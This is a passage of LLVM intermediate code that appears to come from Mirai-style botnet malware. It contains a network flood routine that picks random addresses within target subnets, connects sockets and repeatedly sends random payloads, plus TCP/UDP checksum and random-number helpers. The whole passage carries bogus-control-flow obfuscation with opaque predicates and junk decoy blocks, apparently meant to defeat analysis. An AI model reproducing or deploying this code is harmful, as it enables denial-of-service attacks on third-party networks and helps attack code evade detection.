  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 0, i32* %175, align 4
  %176 = load i32*, i32** %11, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i32, i32* %176, i64 %178
  %180 = load i32, i32* %179, align 4
  %181 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %182 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %182, %struct.sockaddr** %181, align 8
  %183 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %184 = load %struct.sockaddr*, %struct.sockaddr** %183, align 8
  %185 = call i32 @bind(i32 %180, %struct.sockaddr* %184, i32 16) #6
  %186 = icmp eq i32 %185, -1
  %187 = load i32, i32* @x.31
  %188 = load i32, i32* @y.32
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %186, label %195, label %212

; <label>:195:                                    ; preds = %originalBBpart216
  %196 = load i32, i32* @x.31
  %197 = load i32, i32* @y.32
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %195
  %204 = load i32, i32* @x.31
  %205 = load i32, i32* @y.32
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %212

; <label>:212:                                    ; preds = %originalBBpart220, %originalBBpart216
  %213 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i64 %215
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i32 0, i32 2
  %218 = load i8, i8* %217, align 4
  %219 = zext i8 %218 to i32
  %220 = icmp slt i32 %219, 32
  br i1 %220, label %221, label %247

; <label>:221:                                    ; preds = %212
  %222 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 1
  %227 = load i32, i32* %226, align 4
  %228 = call i32 @ntohl(i32 %227) #7
  %229 = call i32 @rand_next()
  %230 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 2
  %235 = load i8, i8* %234, align 4
  %236 = zext i8 %235 to i32
  %237 = lshr i32 %229, %236
  %238 = add i32 %228, %237
  %239 = call i32 @htonl(i32 %238) #7
  %240 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %243, i32 0, i32 0
  %245 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %244, i32 0, i32 2
  %246 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %245, i32 0, i32 0
  store i32 %239, i32* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %221, %212
  %248 = load i32*, i32** %11, align 8
  %249 = load i32, i32* %9, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i32, i32* %248, i64 %250
  %252 = load i32, i32* %251, align 4
  %253 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %254 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %255 = load i32, i32* %9, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i64 %256
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %257, i32 0, i32 0
  %259 = bitcast %struct.sockaddr_in* %258 to %struct.sockaddr*
  store %struct.sockaddr* %259, %struct.sockaddr** %253, align 8
  %260 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %261 = load %struct.sockaddr*, %struct.sockaddr** %260, align 8
  %262 = call i32 @connect(i32 %252, %struct.sockaddr* %261, i32 16)
  %263 = icmp eq i32 %262, -1
  br i1 %263, label %264, label %265

; <label>:264:                                    ; preds = %247
  br label %265

; <label>:265:                                    ; preds = %264, %247
  br label %266

; <label>:266:                                    ; preds = %265
  %267 = load i32, i32* %9, align 4
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %9, align 4
  br label %90

; <label>:269:                                    ; preds = %90
  br label %270

; <label>:270:                                    ; preds = %originalBBpart236, %269
  %271 = load i32, i32* @x.31
  %272 = load i32, i32* @y.32
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %270
  store i32 0, i32* %9, align 4
  %279 = load i32, i32* @x.31
  %280 = load i32, i32* @y.32
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %287

; <label>:287:                                    ; preds = %346, %originalBBpart224
  %288 = load i32, i32* %9, align 4
  %289 = load i8, i8* %5, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  br i1 %291, label %292, label %349

; <label>:292:                                    ; preds = %287
  %293 = load i8**, i8*** %10, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  store i8* %297, i8** %22, align 8
  %298 = load i8, i8* %15, align 1
  %299 = icmp ne i8 %298, 0
  br i1 %299, label %300, label %320

; <label>:300:                                    ; preds = %292
  %301 = load i32, i32* @x.31
  %302 = load i32, i32* @y.32
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %300
  %309 = load i8*, i8** %22, align 8
  %310 = load i16, i16* %14, align 2
  %311 = zext i16 %310 to i32
  call void @rand_str(i8* %309, i32 %311)
  %312 = load i32, i32* @x.31
  %313 = load i32, i32* @y.32
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %320

; <label>:320:                                    ; preds = %originalBBpart228, %292
  %321 = load i32, i32* @x.31
  %322 = load i32, i32* @y.32
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %320
  %329 = load i32*, i32** %11, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i32, i32* %329, i64 %331
  %333 = load i32, i32* %332, align 4
  %334 = load i8*, i8** %22, align 8
  %335 = load i16, i16* %14, align 2
  %336 = zext i16 %335 to i64
  %337 = call i64 @send(i32 %333, i8* %334, i64 %336, i32 16384)
  %338 = load i32, i32* @x.31
  %339 = load i32, i32* @y.32
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %346

; <label>:346:                                    ; preds = %originalBBpart232
  %347 = load i32, i32* %9, align 4
  %348 = add nsw i32 %347, 1
  store i32 %348, i32* %9, align 4
  br label %287

; <label>:349:                                    ; preds = %287
  %350 = load i32, i32* @x.31
  %351 = load i32, i32* @y.32
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %349
  %358 = load i32, i32* @x.31
  %359 = load i32, i32* @y.32
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %270

originalBBalteredBB:                              ; preds = %originalBB, %54
  %366 = load i16, i16* %13, align 2
  %367 = call zeroext i16 @htons(i16 zeroext %366) #7
  store i16 %367, i16* %13, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %104
  %368 = call i32 @rand_next()
  %369 = trunc i32 %368 to i16
  %370 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %371 = load i32, i32* %9, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i64 %372
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i32 0, i32 0
  %375 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %374, i32 0, i32 1
  store i16 %369, i16* %375, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %145
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %162
  %376 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %376, align 4
  %377 = load i16, i16* %13, align 2
  %378 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %377, i16* %378, align 2
  %379 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %380 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %379, i32 0, i32 0
  store i32 0, i32* %380, align 4
  %381 = load i32*, i32** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds i32, i32* %381, i64 %383
  %385 = load i32, i32* %384, align 4
  %386 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %387 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %387, %struct.sockaddr** %386, align 8
  %388 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %389 = load %struct.sockaddr*, %struct.sockaddr** %388, align 8
  %390 = call i32 @bind(i32 %385, %struct.sockaddr* %389, i32 16) #6
  %391 = icmp eq i32 %390, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %195
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %270
  store i32 0, i32* %9, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %300
  %392 = load i8*, i8** %22, align 8
  %393 = load i16, i16* %14, align 2
  %394 = zext i16 %393 to i32
  call void @rand_str(i8* %392, i32 %394)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %320
  %395 = load i32*, i32** %11, align 8
  %396 = load i32, i32* %9, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds i32, i32* %395, i64 %397
  %399 = load i32, i32* %398, align 4
  %400 = load i8*, i8** %22, align 8
  %401 = load i16, i16* %14, align 2
  %402 = zext i16 %401 to i64
  %403 = call i64 @send(i32 %399, i8* %400, i64 %402, i32 16384)
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %349
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = load i32, i32* @x.33
  %4 = load i32, i32* @y.34
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.33
  %15 = load i32, i32* @y.34
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %32, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp ugt i32 %23, 1
  br i1 %24, label %25, label %35

; <label>:25:                                     ; preds = %22
  %26 = load i16*, i16** %11, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %11, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %13, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %13, align 8
  br label %32

; <label>:32:                                     ; preds = %25
  %33 = load i32, i32* %12, align 4
  %34 = sub i32 %33, 2
  store i32 %34, i32* %12, align 4
  br label %22

; <label>:35:                                     ; preds = %22
  %36 = load i32, i32* %12, align 4
  %37 = icmp eq i32 %36, 1
  br i1 %37, label %38, label %45

; <label>:38:                                     ; preds = %35
  %39 = load i16*, i16** %11, align 8
  %40 = load i16, i16* %39, align 2
  %41 = trunc i16 %40 to i8
  %42 = sext i8 %41 to i64
  %43 = load i64, i64* %13, align 8
  %44 = add i64 %43, %42
  store i64 %44, i64* %13, align 8
  br label %45

; <label>:45:                                     ; preds = %38, %35
  %46 = load i32, i32* @x.33
  %47 = load i32, i32* @y.34
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i64, i64* %13, align 8
  %55 = lshr i64 %54, 16
  %56 = load i64, i64* %13, align 8
  %57 = and i64 %56, 65535
  %58 = add i64 %55, %57
  store i64 %58, i64* %13, align 8
  %59 = load i64, i64* %13, align 8
  %60 = lshr i64 %59, 16
  %61 = load i64, i64* %13, align 8
  %62 = add i64 %61, %60
  store i64 %62, i64* %13, align 8
  %63 = load i64, i64* %13, align 8
  %64 = xor i64 %63, -1
  %65 = trunc i64 %64 to i16
  %66 = load i32, i32* @x.33
  %67 = load i32, i32* @y.34
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart229, label %originalBB1alteredBB

originalBBpart229:                                ; preds = %originalBB1
  ret i16 %65

originalBBalteredBB:                              ; preds = %originalBB, %2
  %74 = alloca i16*, align 8
  %75 = alloca i32, align 4
  %76 = alloca i64, align 8
  store i16* %0, i16** %74, align 8
  store i32 %1, i32* %75, align 4
  store i64 0, i64* %76, align 8
  store i64 0, i64* %76, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %77 = load i64, i64* %13, align 8
  %_ = sub i64 %77, 16
  %gen = mul i64 %_, 16
  %_2 = sub i64 %77, 16
  %gen3 = mul i64 %_2, 16
  %_4 = sub i64 0, %77
  %gen5 = add i64 %_4, 16
  %78 = lshr i64 %77, 16
  %79 = load i64, i64* %13, align 8
  %_6 = sub i64 0, %79
  %gen7 = add i64 %_6, 65535
  %_8 = shl i64 %79, 65535
  %_9 = sub i64 0, %79
  %gen10 = add i64 %_9, 65535
  %80 = and i64 %79, 65535
  %_11 = shl i64 %78, %80
  %81 = add i64 %78, %80
  store i64 %81, i64* %13, align 8
  %82 = load i64, i64* %13, align 8
  %_12 = sub i64 0, %82
  %gen13 = add i64 %_12, 16
  %_14 = shl i64 %82, 16
  %_15 = sub i64 %82, 16
  %gen16 = mul i64 %_15, 16
  %83 = lshr i64 %82, 16
  %84 = load i64, i64* %13, align 8
  %_17 = sub i64 0, %84
  %gen18 = add i64 %_17, %83
  %_19 = sub i64 %84, %83
  %gen20 = mul i64 %_19, %83
  %_21 = shl i64 %84, %83
  %85 = add i64 %84, %83
  store i64 %85, i64* %13, align 8
  %86 = load i64, i64* %13, align 8
  %_22 = sub i64 %86, -1
  %gen23 = mul i64 %_22, -1
  %_24 = shl i64 %86, -1
  %_25 = shl i64 %86, -1
  %_26 = sub i64 0, %86
  %gen27 = add i64 %_26, -1
  %87 = xor i64 %86, -1
  %88 = trunc i64 %87 to i16
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %42, %4
  %24 = load i32, i32* @x.35
  %25 = load i32, i32* @y.36
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i32, i32* %8, align 4
  %33 = icmp sgt i32 %32, 1
  %34 = load i32, i32* @x.35
  %35 = load i32, i32* @y.36
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %33, label %42, label %52

; <label>:42:                                     ; preds = %originalBBpart2
  %43 = load i16*, i16** %9, align 8
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  %48 = load i16*, i16** %9, align 8
  %49 = getelementptr inbounds i16, i16* %48, i32 1
  store i16* %49, i16** %9, align 8
  %50 = load i32, i32* %8, align 4
  %51 = sub nsw i32 %50, 2
  store i32 %51, i32* %8, align 4
  br label %23

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, 1
  br i1 %54, label %55, label %78

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* @x.35
  %57 = load i32, i32* @y.36
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i16*, i16** %9, align 8
  %65 = bitcast i16* %64 to i8*
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = load i32, i32* %12, align 4
  %69 = add i32 %68, %67
  store i32 %69, i32* %12, align 4
  %70 = load i32, i32* @x.35
  %71 = load i32, i32* @y.36
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB1alteredBB

originalBBpart28:                                 ; preds = %originalBB1
  br label %78

; <label>:78:                                     ; preds = %originalBBpart28, %52
  %79 = load i32, i32* %10, align 4
  %80 = lshr i32 %79, 16
  %81 = and i32 %80, 65535
  %82 = load i32, i32* %12, align 4
  %83 = add i32 %82, %81
  store i32 %83, i32* %12, align 4
  %84 = load i32, i32* %10, align 4
  %85 = and i32 %84, 65535
  %86 = load i32, i32* %12, align 4
  %87 = add i32 %86, %85
  store i32 %87, i32* %12, align 4
  %88 = load i32, i32* %11, align 4
  %89 = lshr i32 %88, 16
  %90 = and i32 %89, 65535
  %91 = load i32, i32* %12, align 4
  %92 = add i32 %91, %90
  store i32 %92, i32* %12, align 4
  %93 = load i32, i32* %11, align 4
  %94 = and i32 %93, 65535
  %95 = load i32, i32* %12, align 4
  %96 = add i32 %95, %94
  store i32 %96, i32* %12, align 4
  %97 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %98 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %97, i32 0, i32 6
  %99 = load i8, i8* %98, align 1
  %100 = zext i8 %99 to i16
  %101 = call zeroext i16 @htons(i16 zeroext %100) #7
  %102 = zext i16 %101 to i32
  %103 = load i32, i32* %12, align 4
  %104 = add i32 %103, %102
  store i32 %104, i32* %12, align 4
  %105 = load i16, i16* %7, align 2
  %106 = zext i16 %105 to i32
  %107 = load i32, i32* %12, align 4
  %108 = add i32 %107, %106
  store i32 %108, i32* %12, align 4
  br label %109

; <label>:109:                                    ; preds = %113, %78
  %110 = load i32, i32* %12, align 4
  %111 = lshr i32 %110, 16
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %113, label %119

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* %12, align 4
  %115 = and i32 %114, 65535
  %116 = load i32, i32* %12, align 4
  %117 = lshr i32 %116, 16
  %118 = add i32 %115, %117
  store i32 %118, i32* %12, align 4
  br label %109

; <label>:119:                                    ; preds = %109
  %120 = load i32, i32* %12, align 4
  %121 = xor i32 %120, -1
  %122 = trunc i32 %121 to i16
  ret i16 %122

originalBBalteredBB:                              ; preds = %originalBB, %23
  %123 = load i32, i32* %8, align 4
  %124 = icmp sgt i32 %123, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %125 = load i16*, i16** %9, align 8
  %126 = bitcast i16* %125 to i8*
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = load i32, i32* %12, align 4
  %_ = sub i32 %129, %128
  %gen = mul i32 %_, %128
  %_2 = sub i32 %129, %128
  %gen3 = mul i32 %_2, %128
  %_4 = sub i32 0, %129
  %gen5 = add i32 %_4, %128
  %_6 = shl i32 %129, %128
  %130 = add i32 %129, %128
  store i32 %130, i32* %12, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %77, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %78

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %37

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* @x.39
  %13 = load i32, i32* @y.40
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = call i32 @rand_next()
  %21 = load i8*, i8** %3, align 8
  %22 = bitcast i8* %21 to i32*
  store i32 %20, i32* %22, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* @x.39
  %30 = load i32, i32* @y.40
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %77

; <label>:37:                                     ; preds = %8
  %38 = load i32, i32* %4, align 4
  %39 = icmp sge i32 %38, 2
  br i1 %39, label %40, label %52

; <label>:40:                                     ; preds = %37
  %41 = call i32 @rand_next()
  %42 = and i32 %41, 65535
  %43 = trunc i32 %42 to i16
  %44 = load i8*, i8** %3, align 8
  %45 = bitcast i8* %44 to i16*
  store i16 %43, i16* %45, align 2
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 2
  store i8* %47, i8** %3, align 8
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = sub i64 %49, 2
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %4, align 4
  br label %60

; <label>:52:                                     ; preds = %37
  %53 = call i32 @rand_next()
  %54 = and i32 %53, 255
  %55 = trunc i32 %54 to i8
  %56 = load i8*, i8** %3, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %3, align 8
  store i8 %55, i8* %56, align 1
  %58 = load i32, i32* %4, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %4, align 4
  br label %60

; <label>:60:                                     ; preds = %52, %40
  %61 = load i32, i32* @x.39
  %62 = load i32, i32* @y.40
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
